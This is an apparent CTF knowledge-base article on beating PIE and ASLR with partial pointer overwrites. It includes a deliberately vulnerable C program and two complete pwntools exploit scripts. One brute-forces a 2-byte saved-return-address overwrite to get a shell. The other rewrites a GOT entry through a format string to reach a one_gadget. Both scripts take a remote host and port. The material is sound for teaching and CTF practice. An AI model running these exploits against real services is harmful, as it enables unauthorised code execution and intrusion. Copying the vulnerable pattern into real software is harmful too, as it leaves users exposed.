---
title: "Partial Overwrite - Beating PIE and ASLR One Nibble at a Time"
category: pwn
subcategory: aslr
type: technique
tags: [partial-overwrite, brute-force, pie, aslr, nibble, off-by-one, got, plt, info-leak, libc-base, fork-server, printf, read, scanf, gets, one-gadget, pwntools, gef, pwndbg, checksec]
difficulty: medium
summary: "Page alignment fixes the low 12 bits of every address, so you can rewrite 1-2 bytes of a pointer and reach a nearby target with no leak at all."
when_to_use:
  - "PIE and/or ASLR are on and you have no information leak of any kind"
  - "The overflow is tiny - one or two bytes past the saved return address"
  - "The target you want (win, a one_gadget, another libc function) is close to a pointer you can already reach"
  - "The service forks or respawns per connection, so a wrong guess only costs one crash"
  - "You need a bootstrap primitive to get the leak that unlocks the real chain"
tools: [pwntools, checksec, gdb, gef, pwndbg, ROPgadget, readelf, objdump, one_gadget]
related: [stack-ret2win, stack-buffer-overflow-basics, mitigation-canary-bypass, mitigation-modern-playbook, mitigation-libc-identification, rop-got-overwrite, rop-one-gadget, rop-ret2libc, fmtstr-arbitrary-write, offset-finder]
---

## TL;DR

Every mapping the kernel hands out is page aligned, so the **low 12 bits of any address are
decided by the ELF file, not by ASLR**. Overwrite only the low bytes of a pointer and you keep
the randomised high bits for free. One byte reaches anything within the same 256 bytes with 100%
reliability; two bytes reach anything within the same 64 KiB at a 1/16 hit rate. Each extra
nibble you have to guess costs another factor of 16.

## Recognise it

- `checksec` says `PIE enabled` and there is no leak anywhere in the program: no `printf(buf)`,
  no uninitialised read, nothing printed back.
- The overflow is **short**: `read(0, buf, 40)` where 40 is exactly `sizeof(buf) + 8 + 1` or `+ 2`,
  or a `scanf("%s")` that is terminated by a length check, or a classic off-by-one null byte.
- The interesting target sits close to something you can already overwrite:
  `win()` a few hundred bytes from the saved return address, `system` near a libc pointer already
  stored in the GOT, a `one_gadget` in the same 64 KiB window as `__libc_start_call_main`.
- The remote is a forking/respawning service (`socat`, `xinetd`, `while true; do nc -lp ...`) so
  crashing is cheap and you can retry hundreds of times per minute.

## Vulnerable source

```c
/* vuln.c - full PIE, NX, no canary, and a two-byte overflow into the saved RIP */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    puts("win() reached");
    system("/bin/sh");
}

void vuln(void) {
    char buf[32];
    printf("> ");
    fflush(stdout);
    read(0, buf, 42);           /* 32 buf + 8 saved rbp + 2 bytes of the saved RIP */
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

```sh
# PIE on, NX on, no canary: the only mitigation in the way is address randomisation
gcc -fno-stack-protector -pie -fPIE -z noexecstack -o vuln vuln.c

checksec --file=./vuln              # expect: PIE enabled, No canary found, NX enabled
readelf -h ./vuln | grep Type       # DYN = PIE, EXEC = fixed load address
nm -C ./vuln | grep -E "win|vuln"   # the *file* offsets, which are what you will write
```

## Theory

### Why the low 12 bits are free

Linux maps everything on 4 KiB page boundaries, so the load base of the executable, of libc, of
the heap and of the stack all satisfy `base & 0xfff == 0`. For any symbol:

```
addr = base + offset        with base & 0xfff == 0
=>  addr & 0xfff == offset & 0xfff        (always known from the ELF file)
=>  addr >> 12  == (base >> 12) + (offset >> 12)   (unknown, randomised)
```

Those bottom 12 bits are three hex nibbles you can write with certainty. They are also why
`libc-database` fingerprinting works (see `mitigation-libc-identification`).

### What each byte of overwrite buys you

Assume the saved RIP currently points at `base + R` and you want `base + W`.

| Bytes written | Bits you control | Reachable targets | Success rate |
|---|---|---|---|
| 1 | 0-7 | `W` and `R` share bits 8+ (same 256-byte block) | 1/1 |
| 1.5 (nibble) | 0-11 | same 4 KiB page | 1/1 |
| 2 | 0-15 | same 64 KiB block | 1/16 |
| 3 | 0-23 | same 16 MiB block | 1/4096 |

The first three nibbles are free. The 4th nibble (bits 12-15) is the first one ASLR actually
moves, so the moment you need it you are guessing 1 value out of 16. In practice:

- **1-byte overwrite**: only works if `(W >> 8) == (R >> 8)`. Check with `nm`.
- **1.5-byte overwrite**: write one full byte plus the low nibble of the next byte. Needs a
  partial write primitive (format string `%hhn`, or an off-by-one that happens to land right).
- **2-byte overwrite**: the workhorse. Write `(W & 0xfff) | (guess << 12)` and loop.

### Where carries bite you

`addr = base + offset` never carries out of bit 12 because `base & 0xfff == 0`. It *can* carry
past bit 16: if `R` and `W` are in different 64 KiB windows of the file, or if the randomised
`base >> 12` plus the two offsets lands them on opposite sides of a 64 KiB boundary, a 2-byte
write produces an address in the wrong window and you simply never hit. Pick a target in the same
window, or accept the 1/4096 of a 3-byte write.

### The fork-server observation

This is the single most important operational fact for brute forcing:

- A service that does `fork()` per connection (a pre-forking daemon, or `socat ... fork` on a
  process that was **already** running) gives every child **the same address space layout as the
  parent**. The PIE base, the libc base and the stack base do not change between connections.
  A wrong guess kills one child; the right nibble stays right forever. You can also brute force
  *byte by byte* -- see `mitigation-canary-bypass`.
- A service that does `fork()` **then** `execve()` per connection (`xinetd`, `socat
  TCP-LISTEN:1337,fork EXEC:./vuln`, most CTF Dockerfiles) re-randomises on every connection.
  Each try is an independent 1/16 coin flip, so you still win in ~16 tries on average, but
  nothing you learn carries over between connections.

Tell them apart: leak or infer any address twice across two connections. Same value twice in a row
means a fork server, and your exploit just became deterministic after one hit.

### Partial GOT overwrite

With Partial RELRO the GOT is writable, and after the first call a GOT slot holds a **real libc
address**. Overwriting its low 2 bytes turns `printf` into anything within 64 KiB of `printf`
inside libc -- typically a `one_gadget` -- with no leak and no libc base:

```
got['printf'] = 0x7f1122ab3e40   (printf)
write low 2 bytes -> 0x7f1122abXYZW
target one_gadget = libc_base + 0xebc81
```

You need `(one_gadget - printf_offset)` to fit in 16 bits; otherwise pick a different GOT entry
whose symbol lives nearer the gadget. Full RELRO makes the GOT read-only and kills this variant
outright -- see `mitigation-modern-playbook`.

### Partial libc pointer overwrite on the stack

Even without a GOT write, `__libc_start_call_main`'s return address is sitting on the stack below
`main`, and every `printf`/`read` leaves libc pointers in dead stack slots. If your overflow
reaches one, rewriting its low 2 bytes redirects it to a `one_gadget` in the same 64 KiB window.
This is the standard trick when the binary is Full RELRO + PIE and the only writable pointer you
can touch is a saved libc return address.

## Attack

1. `checksec` and `readelf -h` to confirm PIE. `nm`/`objdump` for the file offsets of the source
   pointer `R` and the target `W`.
2. Compute `W ^ R` at the byte level. If it fits in 8 bits, you have a deterministic exploit.
   If it fits in 16 bits, you have a 1/16 exploit. If not, move the goalposts: pick a different
   target or a different pointer.
3. Find the exact number of bytes to the pointer (`cyclic 64`, then `cyclic_find` on the crash
   value, or `offset-finder`).
4. Send `padding + p16(W_low12 | guess << 12)` and **send exactly that many bytes** -- a trailing
   newline from `sendline` would overwrite the third byte and destroy the randomised part.
5. Detect success: the target prints something, or you get a shell. Detect failure: `EOFError`,
   SIGSEGV, or silence. Close the connection and retry.
6. Loop. 16 tries is the average, 200 tries is 0.0002% failure. Log the winning nibble.
7. Determine whether the layout is stable (fork server). If it is, hardcode the winning nibble
   and the whole thing becomes a one-shot exploit.

## Exploit

```python
#!/usr/bin/env python3
"""Partial overwrite of a saved return address under PIE: 2 bytes written, 1 nibble guessed.

The low 12 bits of win() are fixed by the ELF; bits 12..15 are the coin flip.

Local:  ./exploit.py
Remote: ./exploit.py HOST PORT
Build:  gcc -fno-stack-protector -pie -fPIE -z noexecstack -o vuln vuln.c
"""
import sys

from pwn import *

BINARY = "./vuln"
OFFSET = 40            # 32 byte buffer + saved rbp; verify with cyclic
MAX_TRIES = 300        # 1/16 per try -> failing 300 times is ~4e-9
PROMPT = b"> "

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "error"


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)


def attempt(nibble):
    """One try. Returns a live tube on success, None otherwise."""
    low = (elf.symbols["win"] & 0xFFF) | (nibble << 12)
    payload = b"A" * OFFSET + p16(low)          # exactly OFFSET+2 bytes, no newline
    io = start()
    try:
        io.recvuntil(PROMPT, timeout=2)
        io.send(payload)
        io.sendline(b"echo PWNED")
        if b"PWNED" in io.recvrepeat(0.4):
            return io
    except EOFError:
        pass
    try:
        io.close()
    except EOFError:
        pass
    return None


def main():
    log.warning("win file offset = %#x, writing %#x + nibble<<12",
                elf.symbols["win"], elf.symbols["win"] & 0xFFF)
    for i in range(MAX_TRIES):
        nibble = i % 16
        io = attempt(nibble)
        if io is not None:
            log.warning("hit on try %d with nibble %#x", i + 1, nibble)
            io.sendline(b"id; cat flag.txt; cat /flag*")
            io.interactive()
            return
        if i % 16 == 15:
            log.warning("%d tries, still nothing", i + 1)
    log.warning("no hit in %d tries - wrong offset, or win is not in the same 64 KiB window",
                MAX_TRIES)


if __name__ == "__main__":
    main()
```

### Partial GOT overwrite to a one_gadget

```python
#!/usr/bin/env python3
"""Partial GOT overwrite with a format string: rewrite the low 2 bytes of a libc
pointer already sitting in the GOT so the next call lands on a one_gadget.

Requires Partial RELRO (writable GOT) and a format-string write primitive.
ONE_GADGET comes from `one_gadget ./libc.so.6`; LIBC_SYM is the GOT entry you clobber.

Local:  ./gotpartial.py
Remote: ./gotpartial.py HOST PORT
Build:  gcc -fno-stack-protector -no-pie -z norelro -z noexecstack -o fmtvuln fmtvuln.c
"""
import sys

from pwn import *

BINARY = "./fmtvuln"
LIBC = "./libc.so.6"
GOT_SYM = "printf"     # the GOT slot to clobber (must already hold a libc address)
ONE_GADGET = 0xEBC81   # offset from `one_gadget ./libc.so.6` - replace with yours
FMT_OFFSET = 6         # your format string's argument index; find it with %p dumps
MAX_TRIES = 300

context.binary = elf = ELF(BINARY, checksec=False)
context.log_level = "error"
libc = ELF(LIBC, checksec=False)


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process(BINARY)


def sanity():
    """A 2-byte write can only move a pointer inside its own 64 KiB window."""
    delta = ONE_GADGET - libc.symbols[GOT_SYM]
    if abs(delta) >= 0x10000:
        log.warning("delta %#x does not fit in 16 bits - pick another GOT entry", delta)
    return delta


def attempt(nibble):
    low = (ONE_GADGET & 0xFFF) | (nibble << 12)
    payload = fmtstr_payload(FMT_OFFSET, {elf.got[GOT_SYM]: p16(low)},
                             write_size="short", numbwritten=0)
    io = start()
    try:
        io.sendline(payload)                 # the write
        io.sendline(b"trigger")              # make the program call GOT_SYM again
        io.sendline(b"echo PWNED")
        if b"PWNED" in io.recvrepeat(0.5):
            return io
    except EOFError:
        pass
    try:
        io.close()
    except EOFError:
        pass
    return None


def main():
    sanity()
    for i in range(MAX_TRIES):
        io = attempt(i % 16)
        if io is not None:
            log.warning("one_gadget hit after %d tries", i + 1)
            io.sendline(b"cat flag.txt; cat /flag*")
            io.interactive()
            return
    log.warning("no hit - try a different one_gadget or a different GOT entry")


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **`sendline` eats your exploit.** The `\n` becomes a third byte and wipes the randomised bits.
  Use `io.send()` and count your bytes.
- **`scanf("%s")` / `gets` add a NUL.** A string-based overflow writes a terminating null after
  your 2 bytes, which is a 3-byte write with the top byte forced to zero. Either accept it
  (useless), or switch to a `read`-style primitive.
- **Off-by-one null byte into the saved rbp.** The classic `buf[i] = 0` off-by-one clobbers the
  LSB of the saved frame pointer, moving the caller's frame up to 255 bytes lower into your
  buffer. That is a 1/1 *stack* partial overwrite and the seed of the "frame pointer overwrite"
  exploit -- see `rop-stack-pivot`.
- **The wrong target is also a crash.** Guessing 15 wrong nibbles gives 15 different wild jumps;
  some of them hang instead of crashing. Always set a timeout on `recvrepeat`/`recvuntil`.
- **Stack ASLR is coarser.** The stack base moves in 16-byte steps over a large range, but the
  offset of a buffer *within* a frame is fixed, so partial overwrites of stack pointers (saved
  rbp, a pointer-to-buffer) are usually deterministic.
- **The heap is page aligned too.** The low 12 bits of a heap pointer are stable for a given
  allocation sequence, which is why partial overwrites of `fd` pointers work in heap exploitation.
- **Brute forcing a non-forking target is pointless** if a crash takes the service down for
  everyone. Check that it respawns before hammering it.
- **Rate limits and flood protection.** Sleep 10-50 ms between tries, reuse one connection if the
  program loops, and cap your attempts.
- **Use the partial overwrite to get a leak, not a shell.** Reaching a `puts(got_entry)` call site
  with a 1/16 brute is often far easier than reaching `win`, and one leak upgrades the whole
  exploit to deterministic. See `mitigation-modern-playbook`.

## Tools

| Tool | Use |
|---|---|
| `checksec --file=./vuln` | Confirm PIE, NX, RELRO before choosing the variant |
| `readelf -h ./vuln` | `Type: DYN` means PIE, `EXEC` means fixed addresses |
| `nm ./vuln` / `objdump -d ./vuln` | File offsets of source and target, to compute the delta |
| `one_gadget ./libc.so.6` | Candidate targets for a partial libc/GOT overwrite |
| `gdb` + `gef`/`pwndbg` (`vmmap`, `checksec`) | Confirm page alignment and the live base per run |
| `cyclic` / `cyclic_find` | Exact distance to the pointer you are shaving |
| `pwntools` `p16`, `fmtstr_payload(write_size="short")` | Emit exactly 2 bytes, not 8 |
| `ltrace`/`strace` on the service | Tell `fork` from `fork+execve`, i.e. stable vs fresh ASLR |
